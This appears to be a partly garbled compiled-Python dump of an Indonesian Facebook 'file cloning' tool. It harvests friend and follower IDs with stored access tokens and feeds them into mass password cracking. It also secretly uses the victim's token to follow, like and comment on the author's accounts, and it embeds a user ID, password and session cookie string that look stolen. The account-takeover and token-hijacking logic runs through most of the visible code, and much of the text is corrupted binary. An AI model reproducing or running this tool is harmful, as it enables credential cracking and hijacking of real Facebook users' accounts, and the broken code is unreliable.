Cookies : znoscript=1;zbusiness.facebook.comri  rw   z�Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zUtext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8ztext/html; charset=utf-8r�   rp  )	r�   rr  rs  r�   r�   ru  r�   r�   r1  r{  z	(EAAG\w+)r:   ZEAArn   rG   r�   r�  rY  r�   z'Run This Script Again : python Multi.py)r2   r3   r�   �_sesr�   �urlsr  r�  r�   r�  r�   r   re   �AttributeErrorr�   r�  r�  r�   r   r   r�  r	   r   )r   Z_cookieZ_headZ_rZ_pZ_hr   r   r   r     s   
@�6zcoke.__init__Nr   r   r   r   r   r�    r   r�  c                   @   r
   )r�  c              
   C   s�  t �� }d}d}d}d}d}d}d}d}	g d�}
g d	�}z9td
d��� }td
d��� }|�d| �}t�|j�}|d }|d }tt	d | � tt	d | � t
|� W n% tyz } ztt	dt|tf  � t�d� t�  W Y d }~nd }~ww |
D ]}|�d| d | � q}|D ]}|�d| d | � q�|�d| d | d | � |�d| d | d | � |�d| d | � t�  d S )NZ4111448792295892�120338706765807Z167879918678352r�  r�  �198550702277940�198552118944465)�100007018489471Z
1675627047r�  r�  r�  )r�  r�  r�  r�  r�  r�  Z230946969169829Z235968105334382Z197993725798487Z218558783741981Z138061478458379rn   rX   ro   rp   r�  zFacebook Name : zId Number   : zToken Invalid >%s%s%s<r:   r�  z/subscribers?access_token=z!/likes?summary=true&access_token=r�  r�  z>https://graph.facebook.com/3048075795436340/comments/?message=)r�   r  r�   r�   r�   r�   r�   r�   r�   r3   re   r�   r�   r>   r   r   r�   r�   rl   )r   Zs_Zpost1Zpost2Zpost3r�  r�  Zpost6Zpost7Zcuri_Z
my_idz_botZmy_post_botr�   rf   r�   r�   r�   r�  r   Zid_botZpost_idr   r   r   r   #  sF   
��
zbot_follow.__init__Nr   r   r   r   r   r�  "  r   r�  c                   @   r
   )�	curi_anakc           	      C   s�   z%t dd��� }t dd��� }t�d| �}t�|j�}|d }|d }W n ty<   tt	d � t
�d� t�  Y nw t dd��� }d	}t�d
| d | d | � d S )Nrn   rX   ro   rp   r�  rr   rY   zHasil/CP-03-12-2021.txtr�  r�  r�  r�  )r�   r�   r�   r�   r�   r�   r�   r�  r�   r3   r   r   r�   r�   )	r   r�   rf   r�   r�   r�   r�  ZanjasZcurir   r   r   r   X  s   

�"zcuri_anak.__init__Nr   r   r   r   r   r�  W  r   r�  c                   @   s   e Zd Zdd� Zed� dS )r�  c                 C   s�  t �d| � z3t �d| �}t�|j�}|d }|d }ttd |dd�  � ttd | � ttd	 | � W n   Y z"g }t �d
| ��� d D ]}z|d }|�|� W qM   Y qMW n	 t	yj   Y nw dt
|� }	|	dksyd|	kr�ttd � d S ttd t |	 t � ttd � ttd �}
|
dv r�tdd�}|�|� |��  tdt d t | t � tttd �� t�  d S 	 d S )Nzuhttps://graph.facebook.com/me/feed/?link=https://fb.com/100007018489471/posts/3105954929648426/?app=fbl&access_token=ro   rp   r�  zAccount Name : r   �
   zYour Id   : r^   z>https://graph.facebook.com/me/friends?limit=9999&access_token=r�   r�   r�   zHave No Friends !z	Friend : z$Do you want to use this token (y/n):r�   )r)   r/   rn   rG   r   zToken : z'Token Found Please,Run : python ./Multi)r�   r�   r�   r�   r�   r�   r�   r3   r�   r�  r�   r   r�   r>   r2   r�   r   r�  r	   )r   rf   r�   r�   r�   r�  �goblokr�  �Fanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol�_idZhaalqZtokr   r   r   r   i  sB   
�


zcek_token.__init__r   N)r   r   r   r   r�   r   r   r   r   r�  h  s    "r�  c                   @   r
   )�buat_oldc              
   C   sr  t td � tdt d t � tdt d t � tdt d t � tdt d	 t � td
t d t � tdt d t � tdt d �}z
tttd ��}W n   d}Y |dksc|dkrst td � t�d� t	�  d S |dks{|dkr�d}d}d}z%t
|�D ]}t�||�}tdd�}|�t|�t|� d � q�|��  W n ty� }	 ztd|	 � t�d� W Y d }	~	nd }	~	ww t td  � ttd! �}
|
d"ks�|
d#kr�td��d� ttd$ � d S ttd% � t�d� t�  d S |d&k�s|d'k�r�d(}d)}d*}z&t
|�D ]}t�||�}tdd�}|�t|�t|� d � �q|��  W n t�yK }	 ztd|	 � t�d� W Y d }	~	nd }	~	ww t td+ � ttd, �}
|
d"k�sb|
d#k�rqtd��d� ttd$ � d S ttd- � t�d� t�  d S |d.k�s�|d/k�rd0}d1}d2}z&t
|�D ]}t�||�}tdd�}|�t|�t|� d � �q�|��  W n t�y� }	 ztd|	 � t�d� W Y d }	~	nd }	~	ww t td+ � ttd3 �}
|
d"k�s�|
d#k�r�td��d� ttd$ � d S ttd- � t�d� t�  d S |d4k�s|d5k�r�d6}d7}d8}z&t
|�D ]}t�||�}tdd�}|�t|�t|� d � �q |��  W n t�y_ }	 ztd|	 � t�d� W Y d }	~	nd }	~	ww t td+ � ttd3 �}
|
d"k�sv|
d#k�r�td��d� ttd$ � d S ttd- � t�d� t�  d S |d9k�s�|d:k�rd;}d<}d=}z&t
|�D ]}t�||�}tdd�}|�t|�t|� d � �q�|��  W n t�y� }	 ztd|	 � t�d� W Y d }	~	nd }	~	ww t td+ � ttd3 �}
|
d"k�s |
d#k�rtd��d� ttd$ � d S ttd> � t�d� t�  d S |d?k�s)|d@k�r�dA}dB}dC}z&t
|�D ]}t�||�}tdd�}|�t|�t|� d � �q4|��  W n t�ys }	 ztd|	 � t�d� W Y d }	~	nd }	~	ww t td+ � ttd3 �}
|
d"k�s�|
d#k�r�td��d� ttd$ � d S ttd- � t�d� t�  d S t tdD � t�d� t	�  d S )ENz Please Choose the Old Idz Form !z[1] 1000000000z*****z[2] 100000000z******z[3] 10000000z*******z[4] 1000000z********z
[5] 100000z	*********z	[6] 10000z
**********r   zOld Form : zLimit : �5000r^   ru   zDon't Empty Om !rY   rw   rK   ig+  i�� Z
1000000000r   r�   z<=>Kiky_And_Wans_And_Jeck
�
Error : %sr:   z.Do you want to immediately start crack?(y/n): �	Select : r)   r/   zDone :vzEnter !!ry   rL   i� i?B Z	100000000z/Do you want to immediately start crack? (Y/n): r�  zToken Enter !!rz   rM   iG� i�� Z10000000r�   r{   rN   iǊ� i���Z1000000r|   rO   i�k�i�ɚ;Z100000z	 Enter !!r~   rP   i�5:Bl   �c(	 �10000zFill in Correctly !)r   r3   r�   r?   r>   r2   r�   r   r   r�  r�   r   r   r�   r   r  r�  r�   r�   r�  r	   rl   )r   ZbenZlim_r�   r�   r�   r�  ZbokeqZold_ar   Znhar   r   r   r   �  s  

0� 

2� 

2� 

2� 

2� 

2� 

zbuat_old.__init__Nr   r   r   r   r   r�  �  r   r�  c                   @   r
   )r�   c              
   C   s�  d}z	t dd��� }W n ty$   t�d� ttd � t�d� Y nw t	td t
 d t d	 �}|dks;|d
krFt�� jd d� �� }t d| d d�}ttd t d t d � t	tdt  �}z3|dkrmd}n*d�|�dd�}d|v r~|dd�}tjd|d�j}t|d�}|jddd�}	|	j}
|
}W n   |}Y z=|dks�d|kr�t�d| �}t�|j�}nt�d| d | �}t�|j�}z|d  }W n ttfy�   d!}Y nw W n" ty� } ztttd" t | t d# �� W Y d }~nd }~ww td$t d% t | t d& � d'}ttd( � z]t d| d d)�}t�d| d* | d+ | ��� d, D ]'}z|d- }|d  }t� |d. | � |�!|d. | d& � W �q4   Y �q4|�"�  t#td/t$t d| d d��%� �  � W n   Y zt�d| d0 | ��� d1 d2 }t&||� W n   Y d3t$t d| d d��%� � }|d4k�s�d4|k�r�ttd5 � n=ttd6 t d | d t � ttd7 � td&t d8 � t	td9 �}|d:v �r�t'd| d ��(d| d � t�  n	 t	td; � t)�  d S )<Nr^   rn   rX   r�   �Token Failed !!rY   �Name File (Example : james)�Enter:Random� : ru   r�  �dump/�.jsonrG   �Tyep >�me�< To Dump Your Own Dataz"Enter Idz or Username Target %s : �https://free.facebook.com/{}�Lookup�ZfburlZcheck�facebook�https://lookup-id.com/r�   r�   �span�coder�  ro   r�  r�  rp   �Name Not Found !z
excuse me z Fill Im Gorrectly !r8   z	Nama   : r   r   zToken CTRL + C And Stop Dump !r  �/subscribers?limit=r�  r�   r�  r�  �Total ID : %sz%/subscribers?limit=5000&access_token=�pagingr�  r�   r�   �:It's possible that the Idz you entered is not published !!zResult Dump : z*Please Copy the Name of the Dump Result !!�5Do you want to directly crack with this file (Y/n) : r  �r/   r)   r�   rw   �Press Enter To Back !!)*r�   r�   r�  r+   r�   r	   r3   r   r   r2   r=   r>   �uuid�uuid4�hex�upperr   r�   r�  r�   r�   r�  r  r  r�   r�   r�   r�   r�  r�   r<   r�  r�   r   r�  r�   r�   r�   �ke_situr�   r�   rl   )r   Znexttrf   �namafir    r�  �payload�mmk�xxx�idtt�aswr�   r�  r�  r�   r   �limitr�  r�  �id_r�  r   r   r   r     s�   
�

���,�� **" 

zdump_follow_ulti.__init__Nr   r   r   r   r   r�     r   r�   c                   @   r
   )r   c           
      C   s�   g }|}|}z>t d| d d�}t�|��� d D ]%}z|d }|d }	|�|d |	 � |�|d |	 d � W q   Y q|��  W n	 tyM   Y nw tt	d	t
t d| d d
��� �  � zt�|��� d d }t||� W d S    Y d S )Nr  r	  r  r�   r�  rp   r�  r   r  rX   r  r�  )r�   r�   r�   r�   r�   r   r�  r�  r�   r3   r�   r�   r   )
r   ZxnhaZnamafr�  ZxnnZnamaar    r�  r�  r�   r   r   r   r   a  s&   
&zke_situ.__init__Nr   r   r   r   r   r   `  r   r   c                   @   r
   )r�   c                 C   s�  z	t dd��� }W n ty"   t�d� ttd � t�d� Y nw z
t	t
td ��}W n   d}Y t
td t d	 t d
 �}|dksJ|dkrUt�� jd d� �� }t d| d d�}ttd t d t d � t|�D �]}|d7 }t
td|  �}z3|dkr�d}n*d�|�dd�}d|v r�|dd�}tjd|d�j}t|d�}	|	jddd�}
|
j}|}W n   |}Y d}z=|dks�d|kr�t�d | �}t�|j�}nt�d!| d" | �}t�|j�}z|d# }W n ttfy�   d$}Y nw W n! t�y } zttd% t  | t d& � W Y d }~qpd }~ww td't d( t | t d' � zJt d| d d)�}t�d!| d* | d+ | ��� d, D ]'}z|d- }|d# }t!�"|d. | � |�#|d. | d' � W �qG   Y �qG|�$�  W qp t�y~   Y qpw d/t%t!� }|d0k�s�d0|k�r�ttd1 � nGt&td2t%t!�  � ttd3 t d | d t � ttd4 � td't d5 � t
td6 �}|d7v �r�t'd| d ��(d| d � t�  n	 t
td8 � t)�  d S )9Nrn   rX   r�   r  rY   � How much do you want to dump? : r:   �Name File (Example : James)r  r  r^   ru   r�  r  r	  rG   zType >r  r  �"Enter Idz or Target Username %s : r  r  r  r  r  r�   r�   r  r  r�  r  ro   r�  r�  rp   r  zId � Not Found !r   �	Name   : r  r  r�  r�   r�  r�  r�   r�   r  r  �Dump Result Name : �#Please Copy the Dump Result Name !!r  r�   r  r  �*r�   r�   r�  r+   r�   r	   r3   r   r   r�   r2   r=   r>   r  r  r  r  r   r�   r�   r�  r�   r�   r�  r  r  r�   r�   r�   r�   r�  r�   r<   r�  r�   r   r�  r�   r�   r�   r�   rl   �r   rf   �tanya_totalr!  r    r�   r�  r"  r#  r$  r%  r&  r'  r�   r�  r�  r�   r   r�  r�  r(  r�  r   r   r   r   v  s�   
�

����� * 

zdump_follow.__init__Nr   r   r   r   r   r�   u  r   r�   c                   @   r
   )�cek_historyc                 C   s�   d}|dks
d|krd S t dd�}t dd��� }|D ]%}z|�dd�}||kr9ttd t | t d � |d	7 }W q   Y q|d	ksHd	|krdttd
 � ttd �}|dks\|dkrbt	d7 a	d S d S |�
|d � |��  d S )Nr^   r  z.idzr  rX   r   z Idz z This Has Been Dump/Crack
rw   z0Do You Want To Dump/Crack With This Idz (Y/n) : r  r/   r)   r:   )r�   r�   r�   r   r3   r<   r>   r2   r�   r2  r   r�  )r   �itZvc�historyZhisr�  r�   r   r   r   r   �  s(   
�
�zcek_history.__init__Nr   r   r   r   r   r3  �  r   r3  c                   @   r
   )r�   c                 C   s�  z	t dd��� }W n ty"   t�d� ttd � t�d� Y nw z
t	t
td ��}W n   d}Y t
td t d	 t d
 �}|dksJ|dkrUt�� jd d� �� }t d| d d�}ttd t d t d � t|�D �]}|d7 }t
td|  �}z3|dkr�d}n*d�|�dd�}d|v r�|dd�}tjd|d�j}t|d�}	|	jddd�}
|
j}|}W n   |}Y d}z=|dks�d|kr�t�d | �}t�|j�}nt�d!| d" | �}t�|j�}z|d# }W n ttfy�   d$}Y nw W n' t�y } zttd% t  | t d& t!|� d' � W Y d }~qpd }~ww td(t d) t | t d( � zJt d| d d*�}t�d!| d+ | d, | ��� d- D ]'}z|d. }|d# }t"�#|d/ | � |�$|d/ | d( � W �qM   Y �qM|�%�  W qp t�y�   Y qpw d0t&t"� }|d1k�s�d1|k�r�ttd2 � nGt'td3t&t"�  � ttd4 t d | d t � ttd5 � td(t d6 � t
td7 �}|d8v �r�t(d| d ��)d| d � t�  n	 t
td9 � t*�  d S ):Nrn   rX   r�   r  rY   r)  r:   r*  r  r  r^   ru   r�  r  r	  rG   r
  r  r  r+  r  r  r  r  r  r�   r�   r  r  r�  r  ro   r�  r�  rp   r  � ID z Not Found ! (rs   r   r-  r  �/friends?limit=r�  r�   r�  r�  r�   r�   r  r  r.  r/  r  r  r  r  )+r�   r�   r�  r+   r�   r	   r3   r   r   r�   r2   r=   r>   r  r  r  r  r   r�   r�   r�  r�   r�   r�  r  r  r�   r�   r�   r�   r�  r�   r<   r  r�  r�   r   r�  r�   r�   r�   r�   rl   r1  r   r   r   r   �  s�   
�

���(�� * 

zdump_public.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c                 C   sh  z	t dd��� }W n ty"   t�d� ttd � t�d� Y nw z
t	t
td ��}W n   d}Y t
td t d	 t d
 �}|dksJ|dkrUt�� jd d� �� }t d| d d�}ttd t d t d � t|�D �]Y}|d7 }t
td|  �}z3|dkr�d}n*d�|�dd�}d|v r�|dd�}tjd|d�j}t|d�}	|	jddd�}
|
j}|}W n   |}Y d}z=|dks�d|kr�t�d | �}t�|j�}nt�d!| d" | �}t�|j�}z|d# }W n ttfy�   d$}Y nw W n! t�y } zttd% t  | t d& � W Y d }~qpd }~ww td't d( t | t d' � zJt d| d d)�}t�d!| d* | d+ | ��� d, D ]'}z|d- }|d# }t!�"|d. | � |�#|d. | d' � W �qG   Y �qG|�$�  W n
 t�y~   Y nw zAt�d!| d/ | d+ | ��� d, D ]'}z|d- }|d# }t!�"|d. | � |�#|d. | d' � W �q�   Y �q�|�$�  W qp t�y�   Y qpw d0t%t!� }|d1k�s�d1|k�r�ttd2 � nGt&td3t%t!�  � ttd4 t d | d t � ttd5 � td't d6 � t
td7 �}|d8v �r(t'd| d ��(d| d � t�  n	 t
td9 � t)�  d S ):Nrn   rX   r�   r  rY   r)  r:   r*  r  r  r^   ru   r�  r  r	  rG   r
  r  �< Dump Your Own Datar+  r  r  r  r  r  r�   r�   r  r  r�  r  ro   r�  r�  rp   r  zID r,  r   r-  r  r  r�  r�   r�  r�  r7  r�   r�   r  r  r.  r/  r  r�   r  r  r0  r1  r   r   r   r   *  s�   
�

����� ** 

zdump_follow_public.__init__Nr   r   r   r   r   r�   )  r   r�   c                   @   r
   )r�   c                 C   sx   t �|�}|D ]2}|d | }zt|d��� }dtt|�� }W n   d}Y ttt | t	 d t
 t | � qd S )Nr�  rX   r�   � ?? z <==> )r+   �listdirr�   r�   r  r�   r�   r3   r<   r?   r>   r=   )r   �folder�dirsr�   �filex�juma�totalr   r   r   r   �  s   
&�zcekfile.__init__Nr   r   r   r   r   r�     r   r�   c                   @   r
   )r�   c                 C   s�   t �|�}|D ]h}|d | }zt|d��� }dtt|�� }W n   d}Y z|�d�d }tt d | }t	|t
 d t t | � W n   Y z|�d�d }	tt d |	 }
t	|
t
 d t t | � W q   Y qd S )	Nr�  rX   r�   r9  r�  r:   z	   <=>   r�  )r+   r:  r�   r�   r  r�   r�   r3   r�   r�   r?   r>   rB   r=   )r   r;  r<  r�   r=  r>  r?  Zijo__Zijo_Zkuning__Zkuning_r   r   r   r   �  s   
@@
�zcekfile_crk.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )r�   c              
   C   s�  zt dd��� }t dd��� }W n ty)   t�d� ttd � t�d� Y nw t	td t
 d t d � ttd	 �}z3|dkrFd}n*d
�|�dd�}d|v rW|dd�}tjd|d�j}t|d�}|jddd�}|j}|}W n   |}Y z=|dks�d|kr�t�d| �}	t�|	j�}
nt�d| d | �}t�|j�}
z|
d }W n ttfy�   d}Y nw W n( ty� } zt	td t | t d � t�d� t�  W Y d }~nd }~ww t	dt d t
 | t d � |dkr�t�d� t�  ttd t d t d �}|d k�s|d!k�rt�� jd d"� �� }t d#d$�}z:t d#d%�}t�d| d& | ��� d' D ]}|d( }|d }t �!|d) | � |�"|d) | d � �q7|�#�  W n
 t�yf   Y nw d*t$t � }|d+k�swd+|k�r�t	td, | d- � t�d� t%�  d S t&td.t$t �  � t d/| d0 d$�}t	td1 d/ | d0 � t	td2 � t'd3d4��5}t d#d��(� }|D ]#}|�)dd �}|�*d)�}d*|d5  }d*|d6  }|�+t,||||� �q�W d   � n	1 �s�w   Y  tdt d7 � d S )8Nrn   rX   r�   r  rY   r
  r  r8  �Enter Idz or Target Username : r  r  r  r  r  r�   r�   r  r  r�  ro   r�  r�  rp   r  r6  r,  r   r-  r  r  z: r^   ru   r�  �.janganeditrG   r  �!/friends?limit=9999&access_token=r�   r�  r�  r�   r�   zPossible ID � Not Public !!r  r  r	  zFile Dump Not Found : z Enter CTRL + Z  STOP Programe !!�   r�   r   r:   r�  )-r�   r�   r�  r+   r�   r	   r3   r   r   r   r�   r>   r2   r�  r�   r�   r�  r  r  r�   r�   r�   r�   r�  r�   r<   r�   r=   r  r  r  r  r�  r�   r   r�  r�   r�   r�   �kikygtgr�   r�   r�   r�  �lonte__)r   rf   r�   r�  r"  r#  r$  r%  r&  r�   r�  r�  r�   r   Znamqr    r�  r�  r(  Zdumppp�kiky_gtgr>  r�   �kiky�mal�nmr   r   r   r   �  s�   
�

���F�  

"<
��zdump_ulti.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )rF  c           	   
   C   sH  t d| d d�}zlt�d| d | ��� d D ]!}z|d }|d }t�|� |�|d	 | d
 � W q   Y q|��  t�d| d | ��� d D ]!}z|d }|d }t�|� |�|d	 | d
 � W qN   Y qN|��  W n	 ty~   Y nw t	j
�dtttttttg�ttt d| d d��� �f � t	j
��  d S )Nr  r	  r  r�  rB  r�   r�  rp   r�  r   �%/subscribers?limit=9999&access_token=z%%s[%sULTIMATE%s] COLLECTED IDZ => %srX   )r�   r�   r�   r�   r�  r�   r   r�  r�  r   r   r>   �pilihr?   r�   r=   rB   r<   r�   r�   r   )	r   �mlrf   r�   ZmamkZlaxkr�  Ziidr�   r   r   r   r   �  s*   "

"

<zlonte__.__init__Nr   r   r   r   r   rF  �  r   rF  c                   @   r
   )r�   c                 C   s`  zt dd��� }t dd��� }W n ty)   t�d� ttd � t�d� Y nw t	td t
 d t d � ttd	 �}z3|dkrFd}n*d
�|�dd�}d|v rW|dd�}tjd|d�j}t|d�}|jddd�}|j}|}W n   |}Y t dd�}	z9t dd�}	t�d| d | ��� d D ]}
|
d }|
d }t�|d | � |	�|d | d � q�|	��  W n	 ty�   Y nw dtt� }|dks�d|kr�t	td  | d! � t�d� t�  d S ttd"tt�  � td#d$��4}t dd��� }|D ]!}|� dd%�}|�!d�}d|d&  }d|d'  }|�"t#|||� q�W d   � d S 1 �s)w   Y  d S )(Nrn   rX   r�   r  rY   r
  r  r8  r@  r  r  r  r  r  r�   r�   r  r  r�  rA  rG   r  r�  rB  r�   r�  rp   r�  r   r�   r�   z Id rC  r  rD  r�   r^   r   r:   )$r�   r�   r�  r+   r�   r	   r3   r   r   r   r�   r>   r2   r�  r�   r�   r�  r  r  r�   r�   r�   r�  r�   r   r�  r�  r�   r�   r�   rE  r�   r�   r�   r�  �lonte_)r   rf   r�   r�  r"  r#  r$  r%  r&  r    r�  r�  r�   r(  rG  r>  r�   rH  rI  rJ  r   r   r   r   �  s^   
�

�

"


�$�zcek_anak_epep.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   r
   )rN  c                 C   s  d}z<g }g }t �d| d | ��� d D ]}|d }|�|� qt �d| d | ��� d D ]}|d }	|�|	� q1W n	 tyG   Y nw dt|� }
dt|� }|
dks\d|
kr]n	|d	t|
tf 7 }|dksnd|kron	|d
t|tf 7 }|dks�d|kr�d S t	t
� |� |� �� d S )Nr^   r�  rB  r�   r�  rK  r�   r�   z | Friends : %s%s%sz | Follower : %s%s%s)r�   r�   r�   r�   r�  r�   r?   r>   r�   r�   r3   )r   rM  rf   r�   Zvoar�  �tololr�  r�  ZJanak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_aswr�  Z_idxr   r   r   r   '  s,   ""�zlonte_.__init__Nr   r   r   r   r   rN  &  r   rN  c                   @   r
   )�chek_botc                 C   s�   z%t dd��� }t dd��� }t�d| �}t�|j�}|d }|d }W n ty<   tt	d � t
�d� t�  Y nw tt	d | � tt	d	 | � t�d
| �}t|jd�}tt|�� d S )Nrn   rX   ro   rp   r�  r�  r:   zYour Facebook name : zYour Facebook ID   : r�  r�   )r�   r�   r�   r�   r�   r�   r�   r�  r�   r3   r   r   r�   r�   r  r�  r  )r   r�   rf   r�   r�   r�   r�  r�   r   r   r   r   D  s"   

�zchek_bot.__init__Nr   r   r   r   r   rP  C  r   rP  c                   @   r
   )�cek_tok_tokc                 C   s�   z	t dd��� }W n   ttd � t�d� t�  Y t�d| ��	� d d }|dv r]t
td	 � t
td
 � t
dt d � ttd �}|dv rMd S t�d� t
td � t�  d S d S )Nrn   rX   r�  r:   zGhttps://graph.facebook.com/me/friends?limit=3&fields=name&access_token=�error�messagezsIt looks like you abused this feature by using it too soon. You are temporarily prohibited from using this feature.zrIt looks like you abused this feature by using it too soon. You are temporarily prohibited from using this featurez)Chances are you can't Dump/Crack/Take Idzr   z+Do You Want To Still Use This Token (Y/n) :r�   r�   zSuccesfull Token Delete!)r�   r�   r�   r3   r   r   r�   r�   r�   r�   r   r2   r+   r�  r	   )r   r�   r�   Zlar   r   r   r   W  s$   


�zcek_tok_tok.__init__Nr   r   r   r   r   rQ  V  r   rQ  c                   @   r
   )r�   c                 C   s�   t �� }ttd �}|�d�d az	t�d�d aW n   daY |}|�dd�}d}|�dt d d�}|�dt d d�}|�dt d�}|�dt d�}||7 }|d7 }|d7 }|t7 }|}t||� t||� t	�  d S )	NzEnter Cookies :rd  r:   r�   r   r^   rc  re  )
r  r  r2   r3   r�   r�   r�   r!  r"  r	   )r   r'  Zmmak_kukis_rf  rg  r   r   r   r   m  s,   


zcek_info_via_kukis.__init__Nr   r   r   r   r   r�   l  r   r�   c                   @   r
   )�looqqc                 C   sB   t �� }d}|jdd|id�j}|jd|dd�d�j}t|� d S )Nz�100049115432333|nazwa123|c_user=100049115432333;datr=D-L3Yb9qkX4OVD6BYFKBzGos;fr=0e0gF45N0UYwoev8e.AWWAO_9BNvqPxu314yuHJ7wRX1M.Bh9-IQ.BU.AAA.0.0.Bh9-IQ.AWUANDgUMjI;sb=EOL3Yb9bJrRKIn0OnMp1mQ1n;xs=50%3AIR11CAuScaPlqA%3A2%3A1643635216%3A-1%3A11120rP  r1  r2  rQ  rR  rS  )r  r  r�   r�   r�   )r   r'  r)  r  r\  r   r   r   r   �  s
   zlooqq.__init__Nr   r   r   r   r   rT  �  r   rT  c                   @   r
   )r�   c           	   
   C   s6  t d� ttd �}|dkrttd � t�d� t�  ztt|d��	� �}W n t
y9   ttd � t�  Y nw ttd t t|� t � td	d
��A}t|d��	� D ]1}|�dd�}z	|�d�\}}W n   |�d�\}}}Y dtttt|||f }|�t|||� qUW d   � n1 s�w   Y  t�  d S )Nr!   zName File : r^   zDon't be empty dearrY   rX   zfile Not FoundzTotal Account : �   r�   r   r�   z'%s[%sOK%s]%s %s|%s|%s                 )r�   r2   r3   r   r   r   r	   r�   r�   r�   r�   r�   r  r>   r�   r�   r�   r�  rb  )	r   Znama_zZtotal__r�   r�   r�   r�   r)  Zbajinganr   r   r   r   �  s    $$��
zcek_apk_hasil_ok.__init__Nr   r   r   r   r   r�   �  r   r�   c                   @   sX  e Zd Zdd� Zee� e�� Zdeef Z	e�
d� e�
d� ee� ed� ede	 � ed� z^e�d�jZe	ev rRed	� e�  ee�� �Ze�d
� W dS ed� ed� ed� ed� ed� e�d� ed�Zedkrzed� W dS edv r�e�
de	 d � e��  W dS W dS    e��  edkr�ee� e�  e�  Y dS Y dS )rl   c                 C   s>  t �d� z,tdd��� }tdd��� }t�d| �}t�|j�}z|d }W n   |d }Y W n   t	t
d � t�d� t�  Y t	t� d	}ttj|d
tid�jd�}|jddd�j}|jddd�j}	|jddd�j}
|jddd�j}|jddd�j}|�dd�a|	�dd�}|
�dd�}|�dd�}|�dd�}d S )Nrm   rn   rX   ro   rp   rq   rr   r:   zhttps://www.whatsmyua.infor�   r{  r�   r}  ZrawUar�  �family�productr+   ZlayoutzrawUa: r^   zfamily: z	product: zos: zlayout: )r+   r�   r�   r�   r�   r�   r�   r�   r�   r�   r3   r   r   r�   r�   �parserr�  r  r�   )r   r�   rf   r�   r�   r�   Zurl_main�sZraw_uarV  Zname_hpZos_ZlyZjenis_uaZjenis_hpZjenis_osZjenis_lyr   r   r   r   �  s8   

�
r�   z%s439493%s6372==r�   rm   z+-------------------------------------------u   [1;92m  [✓] Your Key  : zChttps://raw.githubusercontent.com/James404-cyber/binnos/main/ID.txtz,[92m You Are Using Premium Version.........r:   aZ  [0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0m[0;91m-[0;0mz%[1;92m [!] Tool    : FB-FILE CLONINGz-[1;92m [!] Expired : Your Key Not Registeredz)[1;92m [!] Status  : [1;91mTrail[0;97mrY   a:  [1;92m [01] Start Crack From Public Id 
 [02] Start Crack From Followers
 [03] Start Crack From Friends+Follow & Public+Follow
 [04] Start Creat New Id File
 [05] Start Crack From File
 [06] Start Crack From Follower Follows (V2)
 [07] Creat File Unlimited Crack
 [08] Change User Agent
 [09] Check Facebook Account Options 
 [10] Check Number of Friends (Can't Dump)
 [11] Check Related Applications Using Cookies
 [12] Check ID Applications Through Crack Results OK
 [13] View Crack Result
 [14] Follow My Youtub Chanal 
 [15] Upgrade To (Premium)

 [!] Select One : r^   zQ[1;92m [!] You Have To Upgrade To Premium First, Please Choose Number (15)[1;0m)�15rZ  zkam start https://wa.me/+96598064347?text=hello%20admin,%20I%20want%20to%20buy%20a%20premium%20script%20:%20z >/dev/null�__main__N)r   r   r   r   r�   r�   r+   �getuidr  r�  r�   r�   r�   r�   Zhttprl   r  �geteuid�msgr   r   r2   r�   r   r	   rp   �Jamr   r   r   r   rl   �  sJ    


��c                   @   r
   )�Mainc              
   C   s�   zt �  W n   Y z	t �  t�  W d S  tjjy%   ttd � Y d S  ty? } zttd|  � W Y d }~d S d }~ww )NzJaringan Ada Mati!!!r  )	r_  r	   r�   r�  r   r   r3   r�   r�   )r   r   r   r   r   r   �  s   ",� zMain.__init__Nr   r   r   r   r   r`  �  r   r`  )��__doc__r+   r   r�   �ModuleNotFoundErrorr�   r�   Zbs4Z	mechanizeZgTTSr  r  r   r   r�   r   ZhashlibZ	threadingZurllibr  Z	ipaddressZcalendarr�   �base64�platformr   r   ZwaktuZacakr   rL  r   r   Zressr	   r   Zconcurrent.futuresr   Z
ThreadPoolr�   rE  Zrequests.exceptionsr   rX  r  r�  �mkdirr&  rB   �Hr=   �Br?   �O�Nr�   r<   r>   r�  �cr�  r�  �kr/  r�  �h�qZ
